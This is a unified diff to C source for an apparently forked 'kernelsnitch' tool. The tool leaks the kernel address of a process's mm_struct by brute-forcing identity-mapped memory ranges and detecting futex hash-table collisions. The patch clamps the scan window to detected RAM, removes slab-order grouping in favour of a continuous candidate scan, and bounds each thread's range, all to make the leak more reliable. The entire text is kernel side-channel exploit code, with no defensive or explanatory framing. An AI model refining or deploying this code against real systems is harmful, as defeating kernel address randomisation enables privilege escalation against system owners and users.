@@ -80,6 +80,8 @@ struct kernelsnitch_shared_state {
     size_t cpu_cnt;
     size_t futex_hash_table_size;
     size_t total_futexes;
+    volatile size_t identity_end;   /* runtime-clamped scan window end */
+    volatile size_t ram_bytes;      /* detected MemTotal, for post-validation */
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -200,12 +202,15 @@ static void *__mm_leak(void *arg)
     struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
-    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+        {
+            /* fork: continuous scan (no slab-order grouping) so MM_ORDER
+             * cannot create gaps between candidate strides */
+            size_t coarse_end = coarse_addr + COARSE_SZ;
+            if (coarse_end > range->end) coarse_end = range->end;
+            for (size_t mm_struct_candidate = coarse_addr; (mm_struct_candidate < coarse_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
@@ -266,6 +271,8 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
     ks->mte_enabled = __mte_enabled;
+    ks->identity_end = IDENTITY_END;
+    ks->ram_bytes = 0;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
@@ -363,6 +370,9 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
         mm_leak_arg->range.id = i;
         mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
         mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
+        if (mm_leak_arg->range.end > ks->identity_end) {
+            mm_leak_arg->range.end = ks->identity_end;
+        }
         if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
             mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
         if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
